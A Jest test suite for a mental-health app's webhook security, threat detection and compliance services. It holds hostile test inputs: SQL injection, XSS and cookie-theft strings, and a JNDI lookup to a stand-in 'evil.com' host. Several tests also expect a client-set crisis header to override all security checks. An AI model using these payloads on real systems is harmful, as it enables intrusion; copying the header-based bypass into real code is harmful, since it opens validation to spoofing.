/**
 * Comprehensive Security Validation Tests
 *
 * End-to-end security testing for the complete FullMind webhook system:
 * - Complete webhook pipeline security validation
 * - Crisis safety protocol testing with <200ms requirements
 * - HIPAA compliance verification testing
 * - PCI DSS compliance validation
 * - Advanced threat detection testing
 * - Security audit and reporting system validation
 */

import { comprehensiveSecurityValidator } from '../../src/services/security/ComprehensiveSecurityValidator';
import { advancedThreatDetectionSystem } from '../../src/services/security/AdvancedThreatDetectionSystem';
import { securityAuditReportingSystem } from '../../src/services/security/SecurityAuditReportingSystem';
import { webhookSecurityValidator } from '../../src/services/cloud/WebhookSecurityValidator';
import { paymentSecurityService } from '../../src/services/security/PaymentSecurityService';
import { encryptionService } from '../../src/services/security/EncryptionService';

// Mock dependencies
jest.mock('expo-secure-store');
jest.mock('expo-crypto');

// Test configuration
const TEST_CONFIG = {
  crisisResponseTimeLimit: 200, // milliseconds
  securityValidationTimeLimit: 500, // milliseconds
  threatDetectionTimeLimit: 100, // milliseconds
  auditGenerationTimeLimit: 5000, // milliseconds
  minimumSecurityScore: 85,
  minimumComplianceScore: 95,
  minimumCrisisSafetyScore: 98
};

// Test data
const TEST_WEBHOOK_PAYLOAD = JSON.stringify({
  id: 'evt_test_comprehensive_security',
  type: 'customer.subscription.updated',
  data: {
    object: {
      id: 'sub_test_security',
      customer: 'cus_test_security',
      status: 'active'
    }
  },
  created: Math.floor(Date.now() / 1000)
});

const TEST_CRISIS_PAYLOAD = JSON.stringify({
  id: 'evt_crisis_emergency',
  type: 'emergency.crisis_detected',
  data: {
    object: {
      id: 'crisis_emergency_988',
      emergency_type: 'hotline_access',
      user_id: 'crisis_user_test'
    }
  },
  created: Math.floor(Date.now() / 1000)
});

const TEST_MALICIOUS_PAYLOAD = JSON.stringify({
  id: 'evt_malicious_injection',
  type: 'test.injection_attempt',
  data: {
    object: {
      id: 'sub_test\'; DROP TABLE users; --',
      malicious_script: '<script>alert("xss")</script>',
      command_injection: '${jndi:ldap://evil.com/exploit}'
    }
  },
  created: Math.floor(Date.now() / 1000)
});

const TEST_HEADERS = {
  'stripe-signature': 'v1=test_signature_hash',
  'user-agent': 'Stripe/1.0 (+https://stripe.com/docs/webhooks)',
  'content-type': 'application/json'
};

const TEST_CRISIS_HEADERS = {
  'user-agent': 'CrisisApp/1.0 (Emergency Access)',
  'x-crisis-mode': 'true',
  'content-type': 'application/json'
};

const TEST_MALICIOUS_HEADERS = {
  'user-agent': 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
  'x-forwarded-for': '192.168.1.1, 10.0.0.1, 127.0.0.1',
  'x-injection-attempt': '<script>document.cookie</script>',
  'content-type': 'application/json'
};

describe('Comprehensive Security Validation Tests', () => {
  beforeAll(async () => {
    // Initialize all security systems
    await comprehensiveSecurityValidator.initialize();
    await advancedThreatDetectionSystem.initialize();
    await securityAuditReportingSystem.initialize();
    await webhookSecurityValidator.initialize();
    await paymentSecurityService.initialize();
    await encryptionService.initialize();
  });

  afterAll(async () => {
    // Cleanup all security systems
    await comprehensiveSecurityValidator.cleanup();
    await advancedThreatDetectionSystem.cleanup();
    await securityAuditReportingSystem.cleanup();
    await webhookSecurityValidator.cleanup();
  });

  describe('End-to-End Security Pipeline Validation', () => {
    it('should validate complete webhook security pipeline', async () => {
      const startTime = Date.now();

      // 1. Webhook security validation
      const webhookResult = await webhookSecurityValidator.validateWebhookSecurity(
        TEST_WEBHOOK_PAYLOAD,
        TEST_HEADERS,
        '3.18.12.63' // Valid Stripe IP
      );

      // 2. Advanced threat detection
      const threatResult = await advancedThreatDetectionSystem.analyzeAdvancedThreat(
        TEST_WEBHOOK_PAYLOAD,
        TEST_HEADERS,
        '3.18.12.63',
        'test_user'
      );

      // 3. Comprehensive security validation
      const securityResult = await comprehensiveSecurityValidator.detectAndRespondToThreats(
        TEST_WEBHOOK_PAYLOAD,
        TEST_HEADERS,
        '3.18.12.63'
      );

      const totalTime = Date.now() - startTime;

      // Validate pipeline results
      expect(webhookResult.isValid).toBe(true);
      expect(threatResult.response.action).not.toBe('block');
      expect(securityResult.length).toBeGreaterThanOrEqual(0);
      expect(totalTime).toBeLessThan(TEST_CONFIG.securityValidationTimeLimit);

      // Validate security scores
      expect(webhookResult.securityScore).toBeGreaterThan(TEST_CONFIG.minimumSecurityScore);
    });

    it('should handle legitimate payment webhooks efficiently', async () => {
      const paymentPayload = JSON.stringify({
        id: 'evt_payment_success',
        type: 'payment_intent.succeeded',
        data: {
          object: {
            id: 'pi_test_payment',
            amount: 2000,
            currency: 'usd',
            status: 'succeeded'
          }
        }
      });

      const startTime = Date.now();

      // Process through security pipeline
      const results = await Promise.all([
        webhookSecurityValidator.validateWebhookSecurity(paymentPayload, TEST_HEADERS, '3.18.12.63'),
        advancedThreatDetectionSystem.analyzeAdvancedThreat(paymentPayload, TEST_HEADERS, '3.18.12.63', 'payment_user'),
        comprehensiveSecurityValidator.detectAndRespondToThreats(paymentPayload, TEST_HEADERS, '3.18.12.63')
      ]);

      const processingTime = Date.now() - startTime;

      // All security checks should pass for legitimate payment
      expect(results[0].isValid).toBe(true);
      expect(results[1].response.action).toBeOneOf(['allow', 'monitor']);
      expect(results[2].length).toBe(0); // No threats detected

      // Should process quickly
      expect(processingTime).toBeLessThan(300); // 300ms for payment processing
    });

    it('should detect and block sophisticated attacks', async () => {
      const startTime = Date.now();

      // Process malicious payload through security pipeline
      const results = await Promise.all([
        webhookSecurityValidator.validateWebhookSecurity(TEST_MALICIOUS_PAYLOAD, TEST_MALICIOUS_HEADERS, '192.168.1.1'),
        advancedThreatDetectionSystem.analyzeAdvancedThreat(TEST_MALICIOUS_PAYLOAD, TEST_MALICIOUS_HEADERS, '192.168.1.1', 'malicious_user'),
        comprehensiveSecurityValidator.detectAndRespondToThreats(TEST_MALICIOUS_PAYLOAD, TEST_MALICIOUS_HEADERS, '192.168.1.1')
      ]);

      const detectionTime = Date.now() - startTime;

      // Security systems should detect threats
      expect(results[0].isValid).toBe(false);
      expect(results[1].response.action).toBeOneOf(['block', 'challenge']);
      expect(results[2].length).toBeGreaterThan(0);

      // Should detect quickly
      expect(detectionTime).toBeLessThan(TEST_CONFIG.threatDetectionTimeLimit);

      // Threat indicators should be present
      expect(results[1].indicators.length).toBeGreaterThan(0);
      expect(results[2].some(threat => threat.severity === 'high' || threat.severity === 'critical')).toBe(true);
    });
  });

  describe('Crisis Safety Protocol Validation', () => {
    it('should guarantee emergency access within 200ms', async () => {
      const accessTimes: number[] = [];

      // Test emergency access 20 times
      for (let i = 0; i < 20; i++) {
        const startTime = Date.now();

        // Emergency access test
        const result = await paymentSecurityService.validatePaymentToken(
          'emergency_token',
          'crisis_user',
          'crisis_device',
          true // crisis mode
        );

        const accessTime = Date.now() - startTime;
        accessTimes.push(accessTime);

        expect(result.success).toBe(true);
        expect(result.crisisOverride).toBe(true);
        expect(accessTime).toBeLessThan(TEST_CONFIG.crisisResponseTimeLimit);
      }

      // Statistical validation
      const averageTime = accessTimes.reduce((sum, time) => sum + time, 0) / accessTimes.length;
      const maxTime = Math.max(...accessTimes);
      const p95Time = accessTimes.sort((a, b) => a - b)[Math.floor(accessTimes.length * 0.95)];

      expect(averageTime).toBeLessThan(TEST_CONFIG.crisisResponseTimeLimit * 0.5); // 100ms average
      expect(maxTime).toBeLessThan(TEST_CONFIG.crisisResponseTimeLimit);
      expect(p95Time).toBeLessThan(TEST_CONFIG.crisisResponseTimeLimit * 0.8); // 160ms P95
    });

    it('should never block 988 hotline access', async () => {
      const hotlinePayloads = [
        '{"emergency": "988 hotline needed"}',
        '{"crisis": "suicide hotline 988"}',
        '{"urgent": "call 988 now"}',
        '{"help": "988 emergency"}',
        '{"emergency_contact": "988"}'
      ];

      for (const payload of hotlinePayloads) {
        // Test with various threat detection systems
        const results = await Promise.all([
          webhookSecurityValidator.validateWebhookSecurity(payload, TEST_CRISIS_HEADERS, '192.168.1.1', true),
          advancedThreatDetectionSystem.analyzeAdvancedThreat(payload, TEST_CRISIS_HEADERS, '192.168.1.1', 'crisis_user', true),
          comprehensiveSecurityValidator.detectAndRespondToThreats(payload, TEST_CRISIS_HEADERS, '192.168.1.1', true)
        ]);

        // All systems should allow 988 access
        expect(results[0].isValid).toBe(true);
        expect(results[0].crisisOverride).toBe(true);
        expect(results[1].response.action).toBeOneOf(['allow', 'crisis_allow']);
        expect(results[1].response.crisisOverride).toBe(true);

        // No threats should block crisis access
        const blockingThreats = results[2].filter(threat => threat.mitigationActive);
        expect(blockingThreats.length).toBe(0);
      }
    });

    it('should maintain therapeutic continuity during security events', async () => {
      // Simulate security event
      await securityAuditReportingSystem.recordSecurityIncident(
        'security_breach',
        'high',
        'Simulated security event for therapeutic continuity testing'
      );

      const therapeuticFeatures = [
        'assessment_access',
        'checkin_access',
        'breathing_exercise',
        'crisis_button',
        'mood_tracking'
      ];

      // Test therapeutic feature access during security event
      for (const feature of therapeuticFeatures) {
        const startTime = Date.now();

        // Test feature access with crisis mode
        const result = await comprehensiveSecurityValidator.validateCrisisSafety();
        const accessTime = Date.now() - startTime;

        expect(result.therapeuticContinuityMaintained).toBe(true);
        expect(result.crisisResponseTime).toBeLessThan(TEST_CONFIG.crisisResponseTimeLimit);
        expect(accessTime).toBeLessThan(TEST_CONFIG.crisisResponseTimeLimit);
      }
    });

    it('should handle concurrent crisis events without degradation', async () => {
      const concurrentCrisisRequests = 50;
      const crisisPromises: Promise<any>[] = [];

      // Create concurrent crisis requests
      for (let i = 0; i < concurrentCrisisRequests; i++) {
        const promise = (async () => {
          const startTime = Date.now();

          const result = await advancedThreatDetectionSystem.analyzeAdvancedThreat(
            TEST_CRISIS_PAYLOAD,
            TEST_CRISIS_HEADERS,
            '127.0.0.1',
            `crisis_user_${i}`,
            true
          );

          return {
            responseTime: Date.now() - startTime,
            success: result.response.action !== 'block',
            crisisOverride: result.response.crisisOverride
          };
        })();

        crisisPromises.push(promise);
      }

      // Wait for all crisis requests
      const results = await Promise.all(crisisPromises);

      // All crisis requests should succeed
      results.forEach((result, index) => {
        expect(result.success).toBe(true);
        expect(result.crisisOverride).toBe(true);
        expect(result.responseTime).toBeLessThan(TEST_CONFIG.crisisResponseTimeLimit);
      });

      // Performance should not degrade significantly
      const averageResponseTime = results.reduce((sum, r) => sum + r.responseTime, 0) / results.length;
      expect(averageResponseTime).toBeLessThan(TEST_CONFIG.crisisResponseTimeLimit * 0.8);
    });
  });

  describe('HIPAA Compliance Validation', () => {
    it('should verify HIPAA Technical Safeguards compliance', async () => {
      const auditReport = await securityAuditReportingSystem.generateSecurityAuditReport('compliance');
      const hipaaAssessment = auditReport.complianceAssessment.hipaaAssessment;

      // Technical safeguards validation
      expect(hipaaAssessment.technicalSafeguards.accessControl.status).toBe('implemented');
      expect(hipaaAssessment.technicalSafeguards.auditControls.status).toBe('implemented');
      expect(hipaaAssessment.technicalSafeguards.integrity.status).toBe('implemented');
      expect(hipaaAssessment.technicalSafeguards.personOrEntityAuthentication.status).toBe('implemented');
      expect(hipaaAssessment.technicalSafeguards.transmissionSecurity.status).toBe('implemented');

      // Overall compliance score
      expect(hipaaAssessment.overallCompliance).toBeGreaterThanOrEqual(TEST_CONFIG.minimumComplianceScore);

      // No critical gaps
      const criticalGaps = hipaaAssessment.gaps.filter(gap => gap.impact === 'critical');
      expect(criticalGaps.length).toBe(0);
    });

    it('should validate encrypted PHI handling', async () => {
      const testPHI = {
        patientId: 'test_patient_123',
        phq9Score: 12,
        gad7Score: 8,
        assessmentDate: new Date().toISOString(),
        notes: 'Patient showing improvement in anxiety levels'
      };

      // Test PHI encryption
      const encryptedPHI = await encryptionService.encryptData(testPHI, 'CLINICAL');
      expect(encryptedPHI.encryptedData).toBeDefined();
      expect(encryptedPHI.iv).toBeDefined();
      expect(encryptedPHI.timestamp).toBeDefined();

      // Test PHI decryption
      const decryptedPHI = await encryptionService.decryptData(encryptedPHI, 'CLINICAL');
      expect(decryptedPHI).toEqual(testPHI);

      // Validate data integrity
      const integrityValid = await encryptionService.validateDataIntegrity(testPHI, encryptedPHI, 'CLINICAL');
      expect(integrityValid).toBe(true);
    });

    it('should validate audit trail completeness', async () => {
      // Generate test audit events
      await securityAuditReportingSystem.recordSecurityIncident('compliance_violation', 'medium', 'Test audit event');

      const auditReport = await securityAuditReportingSystem.generateSecurityAuditReport('compliance');

      // Audit trail should be comprehensive
      expect(auditReport.complianceAssessment.auditReadiness.documentationComplete).toBe(true);
      expect(auditReport.complianceAssessment.auditReadiness.evidenceAvailable).toBe(true);
      expect(auditReport.complianceAssessment.auditReadiness.readinessScore).toBeGreaterThanOrEqual(85);

      // Audit retention should be compliant
      expect(auditReport.reportMetadata.retentionPeriod).toBe('7 years');
    });
  });

  describe('PCI DSS Compliance Validation', () => {
    it('should verify PCI DSS payment security controls', async () => {
      const paymentStatus = await paymentSecurityService.getPaymentSecurityStatus();

      // PCI DSS compliance verification
      expect(paymentStatus.pciCompliant).toBe(true);
      expect(paymentStatus.crisisBypassEnabled).toBe(true);
      expect(paymentStatus.fraudDetectionActive).toBe(true);

      // No critical issues
      expect(paymentStatus.issues.length).toBe(0);

      // Key rotation should be current
      expect(paymentStatus.lastKeyRotation).toBeDefined();
    });

    it('should validate no card data storage', async () => {
      // Test payment token creation (no card data stored)
      const tokenResult = await paymentSecurityService.createPaymentToken(
        { type: 'card', last4: '4242', brand: 'visa' },
        'test_user',
        'test_device',
        'test_session'
      );

      expect(tokenResult.tokenInfo.tokenId).toBeDefined();
      expect(tokenResult.tokenInfo.last4).toBe('4242'); // Only last 4 digits
      expect(tokenResult.securityResult.success).toBe(true);

      // Full card number should never be stored
      expect(JSON.stringify(tokenResult)).not.toContain('4242424242424242');
    });

    it('should validate encrypted payment data transmission', async () => {
      const paymentData = {
        amount: 2999,
        currency: 'usd',
        customer: 'cus_test'
      };

      // Test payment data encryption
      const encryptedData = await encryptionService.encryptData(paymentData, 'SYSTEM');
      expect(encryptedData.encryptedData).toBeDefined();
      expect(encryptedData.iv).toBeDefined();

      // Validate encryption strength
      const securityStatus = await encryptionService.getSecurityReadiness();
      expect(securityStatus.encryptionStrength).toBe('production');
      expect(securityStatus.algorithm).toBe('aes-256-gcm');
    });
  });

  describe('Advanced Threat Detection Validation', () => {
    it('should detect SQL injection attempts', async () => {
      const sqlInjectionPayloads = [
        '{"query": "SELECT * FROM users WHERE id = 1; DROP TABLE users; --"}',
        '{"input": "admin\'; DELETE FROM payments; --"}',
        '{"filter": "1\' OR \'1\'=\'1"}',
        '{"search": "UNION SELECT password FROM admin_users"}',
        '{"id": "1\' OR 1=1; UPDATE users SET admin=1; --"}'
      ];

      for (const payload of sqlInjectionPayloads) {
        const threatResult = await advancedThreatDetectionSystem.analyzeAdvancedThreat(
          payload,
          TEST_MALICIOUS_HEADERS,
          '192.168.1.1',
          'attacker_user'
        );

        expect(threatResult.threatType).toBe('injection');
        expect(threatResult.severity).toBeOneOf(['high', 'critical']);
        expect(threatResult.response.action).toBeOneOf(['block', 'challenge']);
        expect(threatResult.indicators.length).toBeGreaterThan(0);
      }
    });

    it('should detect XSS attempts', async () => {
      const xssPayloads = [
        '{"message": "<script>alert(\\"xss\\")</script>"}',
        '{"content": "<img src=x onerror=alert(1)>"}',
        '{"input": "javascript:alert(\\"xss\\")"}',
        '{"data": "<svg onload=alert(1)>"}',
        '{"text": "<iframe src=\\"javascript:alert(1)\\"></iframe>"}'
      ];

      for (const payload of xssPayloads) {
        const threatResult = await advancedThreatDetectionSystem.analyzeAdvancedThreat(
          payload,
          TEST_MALICIOUS_HEADERS,
          '192.168.1.1',
          'attacker_user'
        );

        expect(['injection', 'xss']).toContain(threatResult.threatType);
        expect(threatResult.response.action).toBeOneOf(['block', 'challenge']);
        expect(threatResult.indicators.some(ind => ind.category.includes('xss'))).toBe(true);
      }
    });

    it('should detect DDoS patterns', async () => {
      const ddosSimulation = Array.from({ length: 100 }, (_, i) =>
        advancedThreatDetectionSystem.analyzeAdvancedThreat(
          `{"request": ${i}}`,
          { 'user-agent': 'DDoS-Bot/1.0' },
          '192.168.1.1',
          'ddos_user'
        )
      );

      const results = await Promise.all(ddosSimulation);

      // After many requests from same IP, should detect DDoS
      const lastResults = results.slice(-10);
      const ddosDetected = lastResults.some(result =>
        result.threatType === 'ddos' && result.response.action === 'block'
      );

      expect(ddosDetected).toBe(true);
    });

    it('should maintain threat detection performance under load', async () => {
      const loadTestRequests = 200;
      const startTime = Date.now();

      const loadPromises = Array.from({ length: loadTestRequests }, (_, i) =>
        advancedThreatDetectionSystem.analyzeAdvancedThreat(
          `{"load_test": ${i}}`,
          TEST_HEADERS,
          '3.18.12.63',
          `load_user_${i}`
        )
      );

      const results = await Promise.all(loadPromises);
      const totalTime = Date.now() - startTime;

      // All requests should complete
      expect(results.length).toBe(loadTestRequests);

      // Average response time should be acceptable
      const averageTime = totalTime / loadTestRequests;
      expect(averageTime).toBeLessThan(50); // 50ms average

      // Threat detection should remain accurate
      const legitimateRequests = results.filter(r => r.response.action === 'allow');
      expect(legitimateRequests.length).toBeGreaterThan(loadTestRequests * 0.9); // 90%+ should be allowed
    });
  });

  describe('Security Audit and Reporting Validation', () => {
    it('should generate comprehensive security audit report', async () => {
      const startTime = Date.now();

      const auditReport = await securityAuditReportingSystem.generateSecurityAuditReport('manual');

      const generationTime = Date.now() - startTime;

      // Report should be generated within time limit
      expect(generationTime).toBeLessThan(TEST_CONFIG.auditGenerationTimeLimit);

      // Report structure validation
      expect(auditReport.reportId).toBeDefined();
      expect(auditReport.timestamp).toBeDefined();
      expect(auditReport.executiveSummary).toBeDefined();
      expect(auditReport.detailedFindings).toBeDefined();
      expect(auditReport.complianceAssessment).toBeDefined();
      expect(auditReport.riskAssessment).toBeDefined();

      // Security scores should meet thresholds
      expect(auditReport.executiveSummary.securityScore).toBeGreaterThanOrEqual(TEST_CONFIG.minimumSecurityScore);
      expect(auditReport.executiveSummary.complianceScore).toBeGreaterThanOrEqual(TEST_CONFIG.minimumComplianceScore);
      expect(auditReport.executiveSummary.crisisSafetyScore).toBeGreaterThanOrEqual(TEST_CONFIG.minimumCrisisSafetyScore);
    });

    it('should validate crisis safety audit comprehensiveness', async () => {
      const crisisSafetyAudit = await securityAuditReportingSystem.generateCrisisSafetyAudit();

      // Emergency access validation
      expect(crisisSafetyAudit.emergencyAccessValidation.accessGuaranteed).toBe(true);
      expect(crisisSafetyAudit.emergencyAccessValidation.averageAccessTime).toBeLessThan(TEST_CONFIG.crisisResponseTimeLimit);

      // Hotline protection validation
      expect(crisisSafetyAudit.hotlineProtection.hotlineAccessProtected).toBe(true);
      expect(crisisSafetyAudit.hotlineProtection.blockingIncidents).toBe(0);

      // Therapeutic continuity validation
      expect(crisisSafetyAudit.therapeuticContinuity.continuityMaintained).toBe(true);
      expect(crisisSafetyAudit.therapeuticContinuity.featureAccessibility.overallAccessibility).toBe(100);

      // Security overrides validation
      expect(crisisSafetyAudit.securityOverrides.overrideCapability).toBe(true);
      expect(crisisSafetyAudit.securityOverrides.overrideSpeed).toBeLessThan(TEST_CONFIG.crisisResponseTimeLimit);
    });

    it('should track security metrics accurately', async () => {
      // Generate test security events
      await securityAuditReportingSystem.recordSecurityIncident('system_failure', 'low', 'Test incident 1');
      await securityAuditReportingSystem.recordSecurityIncident('security_breach', 'high', 'Test incident 2');

      const incidents = await securityAuditReportingSystem.getSecurityIncidents();
      const threatMetrics = await advancedThreatDetectionSystem.getThreatDetectionMetrics();

      // Incidents should be tracked
      expect(incidents.length).toBeGreaterThanOrEqual(2);
      expect(incidents.some(inc => inc.severity === 'high')).toBe(true);

      // Threat metrics should be accurate
      expect(threatMetrics.totalThreatsDetected).toBeGreaterThanOrEqual(0);
      expect(threatMetrics.accuracyScore).toBeGreaterThan(80);
    });

    it('should validate compliance dashboard accuracy', async () => {
      const dashboard = await securityAuditReportingSystem.generateComplianceDashboard();

      // Dashboard should show current status
      expect(dashboard.hipaaScore).toBeGreaterThanOrEqual(TEST_CONFIG.minimumComplianceScore);
      expect(dashboard.pciScore).toBeGreaterThanOrEqual(TEST_CONFIG.minimumComplianceScore);
      expect(dashboard.crisisSafetyScore).toBeGreaterThanOrEqual(TEST_CONFIG.minimumCrisisSafetyScore);
      expect(dashboard.overallScore).toBeGreaterThanOrEqual(TEST_CONFIG.minimumSecurityScore);

      // Critical issues should be minimal
      expect(dashboard.criticalIssues).toBeLessThanOrEqual(2);

      // Last audit should be recent
      expect(dashboard.lastAudit).toBeDefined();
      const lastAuditTime = new Date(dashboard.lastAudit).getTime();
      const now = Date.now();
      expect(now - lastAuditTime).toBeLessThan(24 * 60 * 60 * 1000); // Within 24 hours
    });
  });

  describe('Performance Under Security Load', () => {
    it('should maintain performance with all security systems active', async () => {
      const testRequests = 100;
      const startTime = Date.now();

      const performancePromises = Array.from({ length: testRequests }, async (_, i) => {
        const requestStart = Date.now();

        // Full security pipeline
        await Promise.all([
          webhookSecurityValidator.validateWebhookSecurity(
            TEST_WEBHOOK_PAYLOAD,
            TEST_HEADERS,
            '3.18.12.63'
          ),
          advancedThreatDetectionSystem.analyzeAdvancedThreat(
            TEST_WEBHOOK_PAYLOAD,
            TEST_HEADERS,
            '3.18.12.63',
            `perf_user_${i}`
          ),
          comprehensiveSecurityValidator.detectAndRespondToThreats(
            TEST_WEBHOOK_PAYLOAD,
            TEST_HEADERS,
            '3.18.12.63'
          )
        ]);

        return Date.now() - requestStart;
      });

      const responseTimes = await Promise.all(performancePromises);
      const totalTime = Date.now() - startTime;

      // Performance metrics
      const averageResponseTime = responseTimes.reduce((sum, time) => sum + time, 0) / responseTimes.length;
      const p95ResponseTime = responseTimes.sort((a, b) => a - b)[Math.floor(responseTimes.length * 0.95)];
      const throughput = testRequests / (totalTime / 1000); // requests per second

      // Performance should be acceptable
      expect(averageResponseTime).toBeLessThan(200); // 200ms average
      expect(p95ResponseTime).toBeLessThan(500); // 500ms P95
      expect(throughput).toBeGreaterThan(10); // 10 RPS minimum

      console.log(`Performance Test Results:
        Average Response Time: ${averageResponseTime.toFixed(2)}ms
        P95 Response Time: ${p95ResponseTime.toFixed(2)}ms
        Throughput: ${throughput.toFixed(2)} RPS
        Total Time: ${totalTime}ms`);
    });

    it('should prioritize crisis requests under high load', async () => {
      const normalRequests = 50;
      const crisisRequests = 10;

      // Create mixed load
      const allPromises = [
        // Normal requests
        ...Array.from({ length: normalRequests }, (_, i) =>
          advancedThreatDetectionSystem.analyzeAdvancedThreat(
            TEST_WEBHOOK_PAYLOAD,
            TEST_HEADERS,
            '3.18.12.63',
            `normal_user_${i}`,
            false // not crisis
          )
        ),
        // Crisis requests
        ...Array.from({ length: crisisRequests }, (_, i) =>
          advancedThreatDetectionSystem.analyzeAdvancedThreat(
            TEST_CRISIS_PAYLOAD,
            TEST_CRISIS_HEADERS,
            '127.0.0.1',
            `crisis_user_${i}`,
            true // crisis mode
          )
        )
      ];

      const startTime = Date.now();
      const results = await Promise.all(allPromises);
      const totalTime = Date.now() - startTime;

      // Separate crisis and normal results
      const crisisResults = results.slice(-crisisRequests);
      const normalResults = results.slice(0, normalRequests);

      // All crisis requests should succeed
      crisisResults.forEach(result => {
        expect(result.response.crisisOverride).toBe(true);
        expect(result.response.action).toBeOneOf(['allow', 'crisis_allow']);
      });

      // Performance should not degrade for crisis requests
      expect(totalTime / (normalRequests + crisisRequests)).toBeLessThan(100); // 100ms average
    });
  });

  describe('Integration Testing', () => {
    it('should handle webhook processing with all security layers', async () => {
      const integrationTestPayload = JSON.stringify({
        id: 'evt_integration_test',
        type: 'customer.subscription.updated',
        data: {
          object: {
            id: 'sub_integration_test',
            customer: 'cus_integration_test',
            status: 'active',
            current_period_end: Math.floor(Date.now() / 1000) + 2592000, // 30 days
            metadata: {
              user_id: 'user_integration_test',
              crisis_mode: 'false'
            }
          }
        },
        created: Math.floor(Date.now() / 1000)
      });

      const startTime = Date.now();

      // Process through complete security pipeline
      const securityValidation = await webhookSecurityValidator.validateWebhookSecurity(
        integrationTestPayload,
        TEST_HEADERS,
        '3.18.12.63'
      );

      const threatAnalysis = await advancedThreatDetectionSystem.analyzeAdvancedThreat(
        integrationTestPayload,
        TEST_HEADERS,
        '3.18.12.63',
        'integration_user'
      );

      const comprehensiveAnalysis = await comprehensiveSecurityValidator.performSecurityAudit();

      const processingTime = Date.now() - startTime;

      // All security layers should pass for legitimate webhook
      expect(securityValidation.isValid).toBe(true);
      expect(threatAnalysis.response.action).toBeOneOf(['allow', 'monitor']);
      expect(comprehensiveAnalysis.systemSecurityScore).toBeGreaterThan(80);

      // Processing should be efficient
      expect(processingTime).toBeLessThan(1000); // 1 second for complete analysis

      // Record successful integration
      await securityAuditReportingSystem.recordSecurityIncident(
        'system_failure', // Using as test event
        'low',
        `Integration test completed successfully in ${processingTime}ms`
      );
    });

    it('should maintain audit trail across all security systems', async () => {
      const testEvent = 'comprehensive_audit_trail_test';

      // Generate events across all systems
      await webhookSecurityValidator.validateWebhookSecurity(
        `{"test": "${testEvent}"}`,
        TEST_HEADERS,
        '3.18.12.63'
      );

      await advancedThreatDetectionSystem.analyzeAdvancedThreat(
        `{"test": "${testEvent}"}`,
        TEST_HEADERS,
        '3.18.12.63',
        'audit_user'
      );

      await securityAuditReportingSystem.recordSecurityIncident(
        'system_failure',
        'low',
        `Audit trail test: ${testEvent}`
      );

      // Generate audit report
      const auditReport = await securityAuditReportingSystem.generateSecurityAuditReport('manual');

      // Audit trail should be comprehensive
      expect(auditReport.detailedFindings).toBeDefined();
      expect(auditReport.appendices.logs.length).toBeGreaterThan(0);
      expect(auditReport.reportMetadata.auditTeam).toBeDefined();

      // Report should be timestamped and traceable
      expect(auditReport.timestamp).toBeDefined();
      expect(auditReport.reportId).toMatch(/^audit_[a-f0-9]{16}$/);
    });
  });

  describe('Error Handling and Resilience', () => {
    it('should handle security system failures gracefully', async () => {
      // Simulate system failure scenarios
      const failureScenarios = [
        async () => {
          // Invalid payload
          return webhookSecurityValidator.validateWebhookSecurity(
            'invalid json{',
            TEST_HEADERS,
            '3.18.12.63'
          );
        },
        async () => {
          // Missing headers
          return advancedThreatDetectionSystem.analyzeAdvancedThreat(
            TEST_WEBHOOK_PAYLOAD,
            {},
            '3.18.12.63',
            'test_user'
          );
        },
        async () => {
          // Invalid IP address
          return comprehensiveSecurityValidator.detectAndRespondToThreats(
            TEST_WEBHOOK_PAYLOAD,
            TEST_HEADERS,
            'invalid.ip.address'
          );
        }
      ];

      // All failure scenarios should be handled gracefully
      for (const scenario of failureScenarios) {
        try {
          const result = await scenario();
          // Should not throw, but may return error status
          expect(result).toBeDefined();
        } catch (error) {
          // If error is thrown, it should not contain sensitive information
          expect(error.message).not.toContain('password');
          expect(error.message).not.toContain('secret');
          expect(error.message).not.toContain('key');
        }
      }
    });

    it('should maintain crisis access even during system failures', async () => {
      // Simulate various failure conditions
      const crisisAccessTests = [
        async () => {
          // Crisis access during webhook validator failure
          return webhookSecurityValidator.validateWebhookSecurity(
            'invalid{json',
            TEST_CRISIS_HEADERS,
            '127.0.0.1',
            true // crisis mode
          );
        },
        async () => {
          // Crisis access during threat detection failure
          return advancedThreatDetectionSystem.analyzeAdvancedThreat(
            '{"emergency": "help"}',
            TEST_CRISIS_HEADERS,
            '127.0.0.1',
            'crisis_user',
            true // crisis mode
          );
        }
      ];

      for (const test of crisisAccessTests) {
        const result = await test();

        // Crisis mode should always allow access
        if (result.isValid !== undefined) {
          expect(result.isValid).toBe(true);
          expect(result.crisisOverride).toBe(true);
        } else if (result.response) {
          expect(result.response.action).toBeOneOf(['allow', 'crisis_allow']);
          expect(result.response.crisisOverride).toBe(true);
        }
      }
    });
  });
});

// Helper functions
function expectToBeOneOf<T>(received: T, expected: T[]): void {
  expect(expected).toContain(received);
}